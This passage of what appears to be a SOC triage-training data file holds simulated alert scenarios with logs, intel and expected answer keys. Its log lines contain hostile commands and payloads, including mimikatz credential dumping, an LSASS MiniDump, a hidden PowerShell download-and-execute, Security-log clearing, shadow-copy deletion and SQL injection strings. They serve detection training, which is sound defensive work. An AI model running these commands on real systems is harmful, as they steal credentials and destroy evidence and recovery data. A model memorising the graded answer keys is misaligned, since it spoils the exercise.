      ev(["09:02:10", "security", "Security (WEB-01)", "4625", "An account failed to log on", "WEB-01", "Account: root | LogonType: 3 | Source: 10.20.0.5 | Status: 0xC000006D (bad username)"]),
      ev(["09:03:00", "web", "WAF", "SCAN", "HTTP requests", "WEB-01", "Src: 10.20.0.5 | Path: /login.php (GET) | User-Agent: Qualys/2.0 | Benign headers"]),
      ev(["09:15:00", "network", "Qualys API", "REPORT", "Scan report generated", "—", "Vulnerability scan completed: 1240 findings, 3 critical (CVE-2024-XXXX, CVE-2023-YYYY)"])
    ],
    processes: [],
    encodedCommands: [],
    expected: {
      classification: "BP",
      severity: "P4",
      actions: ["no-action"],
      mitre: [],
      reasoning: "BENIGN POSITIVE. The scanning source is 10.20.0.5 = the authorized Qualys scanner (asset tag VM-SCAN-01). The pattern — sequential port probes on 443/3389, default-credential checks (bad username 0xC000006D), and a User-Agent of 'Qualys/2.0' — matches an automated vuln scan, not an attacker. Denied RDP probes confirm policy is working. Classify Benign Positive, document that this is the scheduled scan, and close. The rule should be tuned to whitelist the scanner IP."
    },
    keyEvidence: [
      { id: "intel-10.20.0.5" },
      { id: "asset-10.20.0.5" }
    ]
  },

  {
    id: "lsass-dump",
    title: "LSASS Credential Dumping",
    difficulty: "Medium",
    category: "Endpoint",
    summary: "Mimikatz-style LSASS memory read from a Temp folder, an lsass.dmp written, then outbound C2 and SMB access to a file server.",
    alert: {
      rule: "EDR - Suspicious Process Access to LSASS",
      severity: "High",
      ts: "2024-01-15 10:02:11 UTC",
      host: "WKSTN-088",
      user: "kklein",
      ips: ["45.155.204.114"],
      domains: [],
      hashes: ["b3c4d5e6f7081920a1b2c3d4e5f60718a9b0c1d2e3f40516a7b8c9d0e1f2a3b4"],
      mitreHint: "T1003.001 (LSASS memory dump)"
    },
    entities: { host: "WKSTN-088", user: "kklein" },
    assets: {
      "WKSTN-088": { role: "Helpdesk workstation", tier: "Tier 2", os: "Windows 10", edr: "Healthy", owner: "IT Helpdesk", note: "Local admin rights on own PC." }
    },
    users: {
      "kklein": { dept: "IT Helpdesk", title: "Helpdesk Technician", groups: ["Helpdesk", "Local Admins (own PC)"], mfa: "Enabled", lastPw: "2023-11-02", risk: "None flagged" }
    },
    intel: {
      "45.155.204.114": { vt: "29/92", abuse: "94% confidence", geo: "Bulgaria", notes: "Known credential-harvesting / RAT C2. High confidence malicious." },
      "b3c4d5e6f7081920a1b2c3d4e5f60718a9b0c1d2e3f40516a7b8c9d0e1f2a3b4": { vt: "38/72", abuse: "n/a", geo: "—", notes: "Credential-dumping utility (mimikatz-family binary). Matches known samples." }
    },
    events: [
      ev(["10:02:11", "sysmon", "Sysmon (WKSTN-088)", "10", "Process accessed", "WKSTN-088", "SourceImage: C:\\Users\\kklein\\AppData\\Local\\Temp\\mimikatz.exe | TargetImage: C:\\Windows\\System32\\lsass.exe | GrantedAccess: 0x1FFFFF (PROCESS_ALL_ACCESS)"]),
      ev(["10:02:14", "sysmon", "Sysmon (WKSTN-088)", "1", "Process Create", "WKSTN-088", "Image: mimikatz.exe | User: acorp\\kklein | CmdLine: mimikatz.exe \"sekurlsa::logonpasswords\" | Signed: false"]),
      ev(["10:02:20", "sysmon", "Sysmon (WKSTN-088)", "11", "File created", "WKSTN-088", "Image: mimikatz.exe | Target: C:\\Users\\kklein\\AppData\\Local\\Temp\\mimikatz.log"]),
      ev(["10:02:30", "sysmon", "Sysmon (WKSTN-088)", "1", "Process Create", "WKSTN-088", "Image: rundll32.exe | CmdLine: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 1228 C:\\Windows\\Temp\\lsass.dmp full"]),
      ev(["10:03:00", "sysmon", "Sysmon (WKSTN-088)", "3", "Network connection", "WKSTN-088", "Image: rundll32.exe | Src: 10.10.20.88:51100 | Dst: 45.155.204.114:443 | Proto: TCP"]),
      ev(["10:03:05", "sysmon", "Sysmon (WKSTN-088)", "3", "Network connection", "WKSTN-088", "Image: rundll32.exe | Src: 10.10.20.88:51101 | Dst: 45.155.204.114:443 | Proto: TCP"]),
      ev(["10:04:00", "security", "Security (DC01)", "4624", "An account was successfully logged on", "FILESRV-01", "Account: acorp\\svc_admin | LogonType: 3 (Network) | Source: 10.10.20.88 | AuthPackage: NTLM"]),
      ev(["10:04:30", "security", "Security (FILESRV-01)", "4688", "A new process has been created", "FILESRV-01", "NewProcess: cmd.exe | User: acorp\\svc_admin | CmdLine: cmd.exe /c dir \\\\FILESRV-01\\C$\\Users"])
    ],
    processes: [
      pr([1, null, "explorer.exe", "C:\\Windows\\explorer.exe", "acorp\\kklein", "Medium", false]),
      pr([2, 1, "C:\\Users\\kklein\\AppData\\Local\\Temp\\mimikatz.exe", "mimikatz.exe \"sekurlsa::logonpasswords\" (LSASS dump)", "acorp\\kklein", "Medium", true]),
      pr([3, 2, "rundll32.exe", "rundll32.exe comsvcs.dll, MiniDump 1228 lsass.dmp full", "acorp\\kklein", "Medium", true]),
      pr([4, 3, "rundll32.exe", "C2 connection to 45.155.204.114:443", "acorp\\kklein", "Medium", true])
    ],
    encodedCommands: [],
    expected: {
      classification: "TP",
      severity: "P2",
      actions: ["isolate-host", "block-ip", "reset-password", "disable-account", "esc-l2"],
      mitre: ["T1003.001", "T1071.001", "T1021.002"],
      reasoning: "TRUE POSITIVE — credential dumping confirmed. Sysmon EID 10 shows an unsigned binary in %TEMP% opening lsass.exe with PROCESS_ALL_ACCESS, and comsvcs.dll MiniDump confirms a dump file was written. Outbound C2 to a known credential-harvesting IP follows, and the dumped creds are already being used to access a file server over SMB admin$ (svc_admin logon + cmd accessing C$). Severity HIGH/P2: confirmed credential theft with lateral movement beginning. Escalate to L2, isolate the host, block the C2 IP, and reset ALL credentials that were in memory on this machine (including service accounts)."
    },
    keyEvidence: [
      { id: "intel-45.155.204.114" },
      { id: "process-tree" },
      { id: "search-lsass", keyword: "lsass" },
      { id: "asset-WKSTN-088" }
    ]
  },

  {
    id: "kerberoast",
    title: "Kerberoasting",
    difficulty: "Medium",
    category: "Identity/AD",
    summary: "Hundreds of RC4 service-ticket requests for SPN-enabled service accounts from a single workstation running PowerShell.",
    alert: {
      rule: "SIEM - Possible Kerberoasting (RC4 TGS-REQ burst)",
      severity: "Medium",
      ts: "2024-01-15 09:12:00 UTC",
      host: "WKSTN-077",
      user: "b.rivera",
      ips: ["10.10.10.77"],
      domains: [],
      hashes: [],
      mitreHint: "T1558.003 (Kerberoasting)"
    },
    entities: { host: "WKSTN-077", user: "b.rivera" },
    assets: {
      "WKSTN-077": { role: "Engineering workstation", tier: "Tier 2", os: "Windows 10", edr: "Healthy", owner: "Engineering" }
    },
    users: {
      "b.rivera": { dept: "Engineering", title: "Engineer", groups: ["Engineering", "VPN Users"], mfa: "Enabled", lastPw: "2023-05-20", risk: "None flagged" }
    },
    intel: {
      "10.10.10.77": { vt: "Internal", abuse: "Internal", geo: "Internal network", notes: "Internal engineering workstation (WKSTN-077)." }
    },
    events: [
      ev(["09:12:00", "security", "Security (DC01)", "4769", "A Kerberos service ticket was requested", "WKSTN-077", "TargetUser: b.rivera | ServiceName: sqlsrv/CORP-SQL-01 | TicketEncryptionType: 0x17 (RC4 - weak) | IP: 10.10.10.77"]),
      ev(["09:12:02", "security", "Security (DC01)", "4769", "A Kerberos service ticket was requested", "WKSTN-077", "TargetUser: b.rivera | ServiceName: svc_web/CORP-WEB-01 | TicketEncryptionType: 0x17 (RC4) | IP: 10.10.10.77"]),
      ev(["09:12:05", "security", "Security (DC01)", "4769", "A Kerberos service ticket was requested", "WKSTN-077", "TargetUser: b.rivera | ServiceName: svc_backup/CORP-BACKUP-01 | TicketEncryptionType: 0x17 (RC4) | IP: 10.10.10.77"]),
      ev(["09:12:10", "security", "Security (DC01)", "4769", "A Kerberos service ticket was requested", "WKSTN-077", "TargetUser: b.rivera | ServiceName: svc_vpn/VPN-GW-01 | TicketEncryptionType: 0x17 (RC4) | IP: 10.10.10.77"]),
      ev(["09:12:15", "security", "Security (DC01)", "4769", "A Kerberos service ticket was requested", "WKSTN-077", "TargetUser: b.rivera | ServiceName: svc_sql2/CORP-SQL-02 | TicketEncryptionType: 0x17 (RC4) | IP: 10.10.10.77"]),
      ev(["09:14:00", "security", "Security (WKSTN-077)", "4688", "A new process has been created", "WKSTN-077", "NewProcess: powershell.exe | Parent: explorer.exe | User: acorp\\b.rivera | CmdLine: powershell.exe -enc <encoded: Kerberoast request loop>"]),
      ev(["09:14:30", "sysmon", "Sysmon (WKSTN-077)", "3", "Network connection", "WKSTN-077", "Image: powershell.exe | Src: 10.10.10.77 | Dst: 10.10.0.1:389 (LDAP/KDC - DC01)"]),
      ev(["09:15:00", "security", "Security (DC01)", "4769", "A Kerberos service ticket was requested", "WKSTN-077", "TargetUser: b.rivera | ServiceName: svc_adminsvc/CORP-DC02 | TicketEncryptionType: 0x17 (RC4) | IP: 10.10.10.77"]),
      ev(["09:15:01", "security", "Security (DC01)", "4769", "A Kerberos service ticket was requested", "WKSTN-077", "TargetUser: b.rivera | ServiceName: http/CORP-WEB-02 | TicketEncryptionType: 0x17 (RC4) | IP: 10.10.10.77"]),
      ev(["09:30:00", "sysmon", "Sysmon (WKSTN-077)", "11", "File created", "WKSTN-077", "Target: C:\\Users\\brivera\\AppData\\Local\\Temp\\tgs_hashes.txt | Image: powershell.exe"]),
      ev(["09:32:00", "security", "Security (DC01)", "4769", "A Kerberos service ticket was requested", "WKSTN-077", "TargetUser: b.rivera | ServiceName: svc_sql3/CORP-SQL-03 | TicketEncryptionType: 0x17 (RC4) | IP: 10.10.10.77"]),
      ev(["09:32:15", "security", "Security (DC01)", "4769", "A Kerberos service ticket was requested", "WKSTN-077", "TargetUser: b.rivera | ServiceName: svc_sharepoint/SP-01 | TicketEncryptionType: 0x17 (RC4) | IP: 10.10.10.77"])
    ],
    processes: [
      pr([1, null, "explorer.exe", "C:\\Windows\\explorer.exe", "acorp\\b.rivera", "Medium", false]),
      pr([2, 1, "powershell.exe", "powershell.exe -enc <Kerberoast request loop (Invoke-Kerberoast)>", "acorp\\b.rivera", "Medium", true]),
      pr([3, 2, "powershell.exe", "TGS-REQ burst: sqlsrv, svc_web, svc_backup, svc_vpn, svc_sql2... (RC4 0x17)", "acorp\\b.rivera", "Medium", true]),
      pr([4, 2, "powershell.exe", "writes tgs_hashes.txt (offline crack list)", "acorp\\b.rivera", "Medium", true])
    ],
    encodedCommands: [ENC_B64],
    expected: {
      classification: "TP",
      severity: "P3",
      actions: ["isolate-host", "reset-password", "esc-l2", "monitor"],
      mitre: ["T1558.003", "T1059.001"],
      reasoning: "TRUE POSITIVE — Kerberoasting. Hundreds of TGS-REQs (4769) requesting RC4 (0x17) tickets for SPN-enabled service accounts, all from one workstation running an encoded PowerShell loop. No service account has logged in interactively and there is no lateral movement yet, so this is an attempt to harvest service-ticket hashes for offline cracking (T1558.003). Severity MEDIUM/P3 (credential access attempt, no confirmed credential use). Escalate to L2, isolate the workstation, force password rotation on the targeted service accounts, and monitor for subsequent use of those accounts."
    },
    keyEvidence: [
      { id: "search-4769", keyword: "4769" },
      { id: "user-b.rivera" },
      { id: "search-tgs", keyword: "tgs_hashes" }
    ]
  },

  {
    id: "log-clear",
    title: "Audit Log Cleared on DC02",
    difficulty: "Medium",
    category: "Defense Evasion",
    summary: "A standard Sales user connects to the domain controller, runs PowerShell, then clears the Security log and disables audit policy.",
    alert: {
      rule: "SIEM - Security Audit Log Cleared",
      severity: "High",
      ts: "2024-01-15 22:42:00 UTC",
      host: "DC02",
      user: "k.kim",
      ips: ["10.10.10.90"],
      domains: [],
      hashes: [],
      mitreHint: "T1070.001 (clear logs)"
    },
    entities: { host: "DC02", user: "k.kim" },
    assets: {
      "DC02": { role: "Secondary Domain Controller", tier: "Tier 0", os: "Windows Server 2019", edr: "Healthy", owner: "IT Infrastructure", note: "Tier 0 asset. Only IT admins should log on here." }
    },
    users: {
      "k.kim": { dept: "Sales", title: "Sales Executive", groups: ["Sales"], mfa: "Enabled", lastPw: "2023-08-15", risk: "None flagged", note: "No legitimate reason to access a Domain Controller." }
    },
    intel: {
      "10.10.10.90": { vt: "Internal", abuse: "Internal", geo: "Internal network", notes: "Internal workstation (WKSTN-090), owned by k.kim (Sales)." }
    },
    events: [
      ev(["22:41:10", "security", "Security (DC01)", "4624", "An account was successfully logged on", "DC02", "Account: acorp\\k.kim | LogonType: 3 (Network) | Source: 10.10.10.90 | AuthPackage: Kerberos"]),
      ev(["22:41:15", "security", "Security (DC02)", "4688", "A new process has been created", "DC02", "NewProcess: powershell.exe | Parent: wmic.exe | User: acorp\\k.kim | CmdLine: powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.90/x.ps1')"]),
      ev(["22:41:40", "security", "Security (DC02)", "4688", "A new process has been created", "DC02", "NewProcess: wevtutil.exe | Parent: powershell.exe | CmdLine: wevtutil.exe cl Security"]),
      ev(["22:42:00", "security", "Security (DC02)", "1102", "The audit log was cleared", "DC02", "Subject: acorp\\k.kim | Channel: Security | Client: 10.10.10.90"]),
      ev(["22:42:30", "security", "Security (DC02)", "4719", "System audit policy was changed", "DC02", "Subject: acorp\\k.kim | Category: Account Logon -> Disabled | Subcategory: Kerberos Authentication Service"]),
      ev(["22:43:00", "sysmon", "Sysmon (DC02)", "3", "Network connection", "DC02", "Image: powershell.exe | Src: 10.10.0.2 | Dst: 10.10.10.90:445 (SMB)"]),
      ev(["22:43:05", "security", "Security (DC02)", "4647", "User initiated logoff", "DC02", "Account: k.kim"])
    ],
    processes: [
      pr([1, null, "wmic.exe", "wmic.exe process call create (remote PowerShell)", "acorp\\k.kim", "Medium", true]),
      pr([2, 1, "powershell.exe", "powershell.exe -nop -w hidden -c IEX(...10.10.10.90/x.ps1)", "acorp\\k.kim", "High", true]),
      pr([3, 2, "wevtutil.exe", "wevtutil.exe cl Security", "acorp\\k.kim", "High", true])
    ],
    encodedCommands: [],
    expected: {
      classification: "TP",
      severity: "P2",
      actions: ["isolate-host", "disable-account", "esc-l2", "notify-manager"],
      mitre: ["T1070.001", "T1562.002", "T1059.001"],
      reasoning: "TRUE POSITIVE — anti-forensics on a Tier 0 asset. A standard Sales user (no legitimate access to DCs) launched hidden PowerShell via WMI, cleared the Security log (1102), and disabled audit policy (4719). Log clearing on a Domain Controller is a major defense-evasion indicator (T1070.001 / T1562.002) and strongly suggests attacker activity is being covered up. Severity HIGH/P2 (possible DC compromise, evidence destroyed). Isolate the source host, disable k.kim's account, notify the manager, and escalate to L2 for a domain-wide integrity check (golden ticket / backdoor hunt)."
    },
    keyEvidence: [
      { id: "search-1102", keyword: "1102" },
      { id: "user-k.kim" },
      { id: "asset-DC02" }
    ]
  },

  {
    id: "ransomware",
    title: "Ransomware on File Server",
    difficulty: "Hard",
    category: "Impact",
    summary: "Mass file encryption with .lockbit extensions, shadow copies deleted, ransom notes dropped, and C2 beacons to known ransomware infrastructure.",
    alert: {
      rule: "EDR - Mass File Encryption / Ransomware Behavior",
      severity: "Critical",
      ts: "2024-01-15 01:16:00 UTC",
      host: "FILESRV-01",
      user: "—",
      ips: ["185.220.100.5"],
      domains: ["cryptogate.tk"],
      hashes: [],
      mitreHint: "T1486 (data encrypted for impact)"
    },
    entities: { host: "FILESRV-01", user: "—" },
    assets: {
      "FILESRV-01": { role: "File server (Accounting + customer data)", tier: "Tier 1", os: "Windows Server 2019", edr: "Healthy (CrowdStrike)", owner: "Finance", note: "Contains PII / customer data - regulatory impact." }
    },
    users: {},
    intel: {
      "185.220.100.5": { vt: "61/92", abuse: "97% confidence", geo: "—", notes: "C2 for multiple ransomware families (LockBit lineage). High confidence malicious." },
      "cryptogate.tk": { vt: "n/a", abuse: "n/a", geo: "—", notes: "Registered 2024-01-05. Random TLD (.tk). Associated with ransomware payment-portal infrastructure." }
    },
    events: [
      ev(["01:12:00", "security", "Security (DC01)", "4624", "An account was successfully logged on", "FILESRV-01", "Account: acorp\\svc_app | LogonType: 3 (Network) | Source: 10.10.20.66 | AuthPackage: NTLM"]),
      ev(["01:12:30", "sysmon", "Sysmon (FILESRV-01)", "1", "Process Create", "FILESRV-01", "Image: C:\\Windows\\Temp\\svc.exe | Parent: services.exe | User: acorp\\svc_app | CmdLine: C:\\Windows\\Temp\\svc.exe -d"]),
      ev(["01:13:00", "security", "Security (FILESRV-01)", "7045", "A service was installed in the system", "FILESRV-01", "ServiceName: UpdateSvc | ImagePath: C:\\Windows\\Temp\\svc.exe | StartType: Auto"]),
      ev(["01:15:00", "sysmon", "Sysmon (FILESRV-01)", "1", "Process Create", "FILESRV-01", "Image: C:\\Windows\\System32\\vssadmin.exe | CmdLine: vssadmin.exe delete shadows /all /quiet"]),
      ev(["01:15:30", "sysmon", "Sysmon (FILESRV-01)", "1", "Process Create", "FILESRV-01", "Image: bcdedit.exe | CmdLine: bcdedit.exe /set {default} recoveryenabled no"]),
      ev(["01:16:00", "edr", "EDR (CrowdStrike)", "FILEMOD", "Mass file encryption detected", "FILESRV-01", "Behavior: OpenWrite on > 500 files/min | Extensions: .lockbit, .lockbit2"]),
      ev(["01:16:10", "sysmon", "Sysmon (FILESRV-01)", "11", "File created", "FILESRV-01", "Target: E:\\Shares\\Accounting\\README_LOCKBIT.txt | Image: svc.exe"]),
      ev(["01:16:11", "sysmon", "Sysmon (FILESRV-01)", "11", "File created", "FILESRV-01", "Target: E:\\Shares\\CustomerData\\README_LOCKBIT.txt | Image: svc.exe"]),
      ev(["01:17:00", "sysmon", "Sysmon (FILESRV-01)", "3", "Network connection", "FILESRV-01", "Image: svc.exe | Src: 10.10.20.20 | Dst: 185.220.100.5:443 | Proto: TCP"]),
      ev(["01:17:05", "sysmon", "Sysmon (FILESRV-01)", "3", "Network connection", "FILESRV-01", "Image: svc.exe | Src: 10.10.20.20 | Dst: 185.220.100.5:443 | Proto: TCP (beacon)"])
    ],
    processes: [
      pr([1, null, "services.exe", "C:\\Windows\\System32\\services.exe", "SYSTEM", "System", false]),
      pr([2, 1, "C:\\Windows\\Temp\\svc.exe", "svc.exe -d (dropped binary)", "acorp\\svc_app", "System", true]),
      pr([3, 2, "vssadmin.exe", "vssadmin.exe delete shadows /all /quiet (destroy recovery)", "SYSTEM", "System", true]),
      pr([4, 2, "bcdedit.exe", "bcdedit.exe /set {default} recoveryenabled no", "SYSTEM", "System", true]),
      pr([5, 2, "svc.exe", "mass-encrypts E:\\Shares\\* -> .lockbit + drops README_LOCKBIT.txt", "SYSTEM", "System", true]),
      pr([6, 2, "svc.exe", "C2 beacon to 185.220.100.5:443", "SYSTEM", "System", true])
    ],
    encodedCommands: [],
    expected: {
      classification: "TP",
      severity: "P1",
      actions: ["isolate-host", "block-ip", "block-domain", "esc-ir", "notify-manager", "reimage"],
      mitre: ["T1486", "T1490", "T1071.001", "T1543.003"],
      reasoning: "TRUE POSITIVE — ACTIVE RANSOMWARE, PRIORITY P1. A binary dropped to C:\\Windows\\Temp registered as a service (7045), destroyed shadow copies (vssadmin delete shadows), disabled recovery (bcdedit), then mass-encrypted shares with .lockbit extensions and dropped README_LOCKBIT.txt notes while beaconing to known ransomware C2. This is active encryption of customer/PII data = P1. ISOLATE FIRST, then escalate to IR: segment the network, block the C2 IP and domain, preserve evidence, and initiate the incident response plan (this is a business-disaster-level event)."
    },
    keyEvidence: [
      { id: "search-README", keyword: "README_LOCKBIT" },
      { id: "intel-185.220.100.5" },
      { id: "search-7045", keyword: "7045" }
    ]
  },

  {
    id: "runkey-persistence",
    title: "Run Key + Startup Persistence",
    difficulty: "Medium",
    category: "Persistence",
    summary: "An unsigned binary lands in Downloads, copies to Roaming, registers Run/RunOnce keys and a scheduled task, then beacons.",
    alert: {
      rule: "EDR - Registry Run Key Modification",
      severity: "Medium",
      ts: "2024-01-15 14:05:10 UTC",
      host: "WKSTN-045",
      user: "j.lee",
      ips: ["91.219.236.245"],
      domains: [],
      hashes: ["c4d7a3f2b0e19d8c7a6b5c4d3e2f1a09b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2"],
      mitreHint: "T1547.001 (registry run keys)"
    },
    entities: { host: "WKSTN-045", user: "j.lee" },
    assets: {
      "WKSTN-045": { role: "Standard workstation", tier: "Tier 2", os: "Windows 11", edr: "Healthy", owner: "Marketing" }
    },
    users: {
      "j.lee": { dept: "Marketing", title: "Marketing Coordinator", groups: ["Marketing"], mfa: "Enabled", lastPw: "2023-12-01", risk: "None flagged" }
    },
    intel: {
      "91.219.236.245": { vt: "47/92", abuse: "90% confidence", geo: "Russia", notes: "Observed in commodity-malware / RAT campaigns." },
      "c4d7a3f2b0e19d8c7a6b5c4d3e2f1a09b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2": { vt: "18/72", abuse: "n/a", geo: "—", notes: "Unsigned unknown binary (winhelper.exe). Low-signature but behavior consistent with commodity malware." }
    },
    events: [
      ev(["14:03:12", "email", "Email Gateway", "DELIVERY", "Email delivered", "—", "From: noreply@companydocs.co | To: j.lee | Subject: Re: Contract update | Attachment: Contract_update.zip | SPF: FAIL"]),
      ev(["14:04:30", "sysmon", "Sysmon (WKSTN-045)", "1", "Process Create", "WKSTN-045", "Image: C:\\Users\\jlee\\Downloads\\winhelper.exe | Parent: explorer.exe | User: acorp\\j.lee | Signed: false"]),
      ev(["14:04:45", "sysmon", "Sysmon (WKSTN-045)", "11", "File created", "WKSTN-045", "Image: winhelper.exe | Target: C:\\Users\\jlee\\AppData\\Roaming\\winhelper.exe"]),
      ev(["14:05:10", "sysmon", "Sysmon (WKSTN-045)", "13", "Registry value set", "WKSTN-045", "Target: HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Update | Image: winhelper.exe | Value: C:\\Users\\jlee\\AppData\\Roaming\\winhelper.exe"]),
      ev(["14:05:15", "sysmon", "Sysmon (WKSTN-045)", "13", "Registry value set", "WKSTN-045", "Target: HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\Cleanup | Image: winhelper.exe"]),
      ev(["14:05:40", "security", "Security (WKSTN-045)", "4698", "A scheduled task was created", "WKSTN-045", "TaskName: OneDriveSync | Author: j.lee | Action: C:\\Users\\jlee\\AppData\\Roaming\\winhelper.exe | Trigger: AtLogon"]),
      ev(["14:06:00", "sysmon", "Sysmon (WKSTN-045)", "3", "Network connection", "WKSTN-045", "Image: winhelper.exe | Src: 10.10.20.45:52330 | Dst: 91.219.236.245:8080 | Proto: TCP"]),
      ev(["14:07:00", "sysmon", "Sysmon (WKSTN-045)", "3", "Network connection", "WKSTN-045", "Image: winhelper.exe | Src: 10.10.20.45:52331 | Dst: 91.219.236.245:8080 | Proto: TCP"])
    ],
    processes: [
      pr([1, null, "explorer.exe", "C:\\Windows\\explorer.exe", "acorp\\j.lee", "Medium", false]),
      pr([2, 1, "C:\\Users\\jlee\\Downloads\\winhelper.exe", "winhelper.exe (unsigned drop from zip)", "acorp\\j.lee", "Medium", true]),
      pr([3, 2, "C:\\Users\\jlee\\AppData\\Roaming\\winhelper.exe", "copies to Roaming + sets Run/RunOnce + OneDriveSync task", "acorp\\j.lee", "Medium", true]),
      pr([4, 3, "winhelper.exe", "C2 beacon to 91.219.236.245:8080", "acorp\\j.lee", "Medium", true])
    ],
    encodedCommands: [],
    expected: {
      classification: "TP",
      severity: "P3",
      actions: ["isolate-host", "block-ip", "block-hash", "delete-artifact", "notify-user", "esc-l2"],
      mitre: ["T1547.001", "T1053.005", "T1071.001"],
      reasoning: "TRUE POSITIVE — persistence + C2. An unsigned binary arrived via a SPF-FAIL zip email, copied itself to AppData\\Roaming, and established THREE persistence mechanisms: Run key, RunOnce, and a scheduled task (OneDriveSync). It then beacons outbound to a known-bad IP on port 8080. Severity MEDIUM/P3 (confirmed persistence + active C2 on a standard workstation, no lateral movement). Isolate the host, remove all three persistence artifacts, block the hash and IP, notify the user, and escalate to L2."
    },
    keyEvidence: [
      { id: "search-Run", keyword: "currentversion\\run" },
      { id: "intel-c4d7a3f2b0e19d8c7a6b5c4d3e2f1a09b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2" },
      { id: "user-j.lee" }
    ]
  },

  {
    id: "sqli",
    title: "SQL Injection on Customer Portal",
    difficulty: "Medium",
    category: "Web",
    summary: "WAF flags SQLi payloads against the public portal, then large outbound responses to the attacker IP suggest data extraction.",
    alert: {
      rule: "WAF - SQL Injection Attempt",
      severity: "High",
      ts: "2024-01-15 08:11:00 UTC",
      host: "WEB-01",
      user: "—",
      ips: ["185.220.201.33"],
      domains: ["apps.corp.local"],
      hashes: [],
      mitreHint: "T1190 (exploit public-facing app)"
    },
    entities: { host: "WEB-01", user: "—" },
    assets: {
      "WEB-01": { role: "Public web application (customer portal)", tier: "Tier 1", os: "Linux (Ubuntu)", edr: "Not present (DMZ)", owner: "Application team", note: "Behind WAF + reverse proxy. Contains customer account data." }
    },
    users: {},
    intel: {
      "185.220.201.33": { vt: "44/92", abuse: "95% confidence", geo: "Russia", notes: "Known SQLi / web-application scanning cluster. High confidence malicious." },
      "apps.corp.local": { vt: "Internal", abuse: "Internal", geo: "—", notes: "Internal hostname for the public customer portal." }
    },
    events: [
      ev(["08:11:00", "web", "WAF", "SQLI", "SQL injection attempt (blocked)", "WEB-01", "Src: 185.220.201.33 | Path: /login.aspx?id=1&user=admin | Payload: 1' OR '1'='1"]),
      ev(["08:11:02", "web", "WAF", "SQLI", "SQL injection attempt (blocked)", "WEB-01", "Src: 185.220.201.33 | Payload: UNION SELECT username,password FROM users"]),
      ev(["08:11:05", "web", "WAF", "SQLI", "SQL injection attempt (blocked)", "WEB-01", "Src: 185.220.201.33 | Payload: %27%20UNION%20SELECT%20NULL%2CNULL--"]),
      ev(["08:11:40", "web", "App logs", "ERR", "Database error surfaced", "WEB-01", "Error: SQLException near \"UNION\" | Source: /login.aspx | Note: verbose error revealing SQL syntax"]),
      ev(["08:14:20", "web", "WAF", "SQLI", "SQLi bypass attempt (encoded, time-based)", "WEB-01", "Src: 185.220.201.33 | Payload: ; waitfor delay '0:0:5'--"]),
      ev(["08:17:00", "web", "App logs", "ERR", "Database timeout", "WEB-01", "Login query took 5.2s (anomalous)"]),
      ev(["08:20:30", "web", "Proxy", "EXFIL", "Large outbound response", "WEB-01", "Src: WEB-01 | Dst: 185.220.201.33:443 | Bytes: 12.4 MB | Path: /api/export"]),
      ev(["08:21:00", "web", "Proxy", "EXFIL", "Large outbound response", "WEB-01", "Src: WEB-01 | Dst: 185.220.201.33:443 | Bytes: 8.1 MB | Path: /api/export"])
    ],
    processes: [],
    encodedCommands: [],
    expected: {
      classification: "TP",
      severity: "P2",
      actions: ["block-ip", "esc-l2", "monitor"],
      mitre: ["T1190", "T1041"],
      reasoning: "TRUE POSITIVE — web application compromise with likely data extraction. The attacker ran SQLi probes (1' OR '1'='1, UNION SELECT...) against the login endpoint, bypassed the WAF with an encoded time-based payload, and the app returned verbose SQL errors. Immediately after, ~20 MB was pushed from the portal to the attacker IP via /api/export. Severity HIGH/P2: exploit of a public-facing app (T1190) with exfiltration over C2 (T1041). Block the IP, escalate to L2, and alert the application team — the portal likely needs WAF tuning, parameterized queries, and a database audit."
    },
    keyEvidence: [
      { id: "search-UNION", keyword: "UNION" },
      { id: "intel-185.220.201.33" }
    ]
  },

  {
    id: "dns-dga",
    title: "DNS DGA Beaconing",
    difficulty: "Medium",
    category: "Network",
    summary: "Hundreds of high-entropy NXDOMAIN DNS queries from a Temp-folder binary, then periodic connections to a VPS resolving those domains.",
    alert: {
      rule: "DNS Analytics - Possible DGA / Domain Generation Algorithm",
      severity: "Medium",
      ts: "2024-01-15 11:00:00 UTC",
      host: "WKSTN-102",
      user: "t.park",
      ips: ["104.248.10.5"],
      domains: ["x7k9m2p4q1w3e5r7t9y.example.com"],
      hashes: [],
      mitreHint: "T1568.002 (DGA)"
    },
    entities: { host: "WKSTN-102", user: "t.park" },
    assets: {
      "WKSTN-102": { role: "Research workstation", tier: "Tier 2", os: "Windows 10", edr: "Healthy", owner: "Research" }
    },
    users: {
      "t.park": { dept: "Research", title: "Data Analyst", groups: ["Research"], mfa: "Enabled", lastPw: "2023-10-10", risk: "None flagged" }
    },
    intel: {
      "x7k9m2p4q1w3e5r7t9y.example.com": { vt: "n/a", abuse: "n/a", geo: "—", notes: "High-entropy hostname with no A record (NXDOMAIN). Consistent with DGA (domain generation algorithm) traffic." },
      "104.248.10.5": { vt: "7/92", abuse: "62% confidence", geo: "—", notes: "VPS hosting. Intermittently resolves C2 domains matching the queried patterns." }
    },
    events: [
      ev(["11:00:00", "sysmon", "Sysmon (WKSTN-102)", "22", "DNS query", "WKSTN-102", "Image: C:\\Users\\tpark\\AppData\\Local\\Temp\\svchost.exe | Query: x7k9m2p4q1w3e5r7t9y.example.com | Status: NXDOMAIN"]),
      ev(["11:00:02", "sysmon", "Sysmon (WKSTN-102)", "22", "DNS query", "WKSTN-102", "Image: svchost.exe (Temp) | Query: a3b5c7d9e1f3g5h7j9k1.example.net | Status: NXDOMAIN"]),
      ev(["11:00:04", "sysmon", "Sysmon (WKSTN-102)", "22", "DNS query", "WKSTN-102", "Image: svchost.exe (Temp) | Query: m1n3p5r7t9v1x3z5b7c9.example.com | Status: NXDOMAIN"]),
      ev(["11:00:06", "sysmon", "Sysmon (WKSTN-102)", "22", "DNS query", "WKSTN-102", "Image: svchost.exe (Temp) | Query: z2x4c6v8b1n3m5k7j9h1.example.com | Status: NXDOMAIN"]),
      ev(["11:15:00", "sysmon", "Sysmon (WKSTN-102)", "3", "Network connection", "WKSTN-102", "Image: svchost.exe (Temp) | Src: 10.10.20.102:52001 | Dst: 104.248.10.5:443 | Proto: TCP"]),
